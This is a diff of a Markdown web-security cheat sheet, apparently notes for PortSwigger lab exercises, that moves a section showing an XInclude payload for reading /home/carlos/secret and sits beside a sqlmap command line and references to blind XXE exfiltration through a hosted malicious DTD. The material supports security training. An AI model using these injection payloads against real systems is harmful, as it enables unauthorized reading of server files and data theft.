@@ -916,6 +916,18 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 ![Identify XML Injections](images/identify-xxe.png)
 
+### Xinclude file read  
+
+>Webapp **Check Stock** feature use server-side XML document that is parsed, but because the entire XML document, not possible to use a DTD file. Injecting an **XInclude** statement to retrieve the contents of /home/carlos/secret file instead.  
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>  
+```  
+
+![XInclude to retrieve files](images/xinclude.png)  
+
+[PortSwigger Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)  
+
 ### DTD Hosted Exploit  
 
 >On the exploit server host a exploit file with **Document Type Definition (DTD)** extension, containing the following payload.  
@@ -946,20 +958,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 ![Exploiting blind XXE to exfiltrate data usding a mlicious exploit DTD file](images/blind-xxe-exploit-dtd.png)  
 
 [PortSwigger Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)  
-
-### Xinclude file read  
-
->Webapp **Check Stock** feature use server-side XML document that is parsed, but because the entire XML document, not possible to use a DTD file. Injecting an **XInclude** statement to retrieve the contents of /home/carlos/secret file instead.  
-
-```xml
-<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>  
-```  
-
-![XInclude to retrieve files](images/xinclude.png)  
-
-[PortSwigger Lab: Exploiting XInclude to retrieve files](https://portswigger.net/web-security/xxe/lab-xinclude-attack)  
-
-
+  
 ### SQL + XML + HackVector 
 
 >SQL injection with filter bypass via XML encoding may allow extract of sensitive data.  
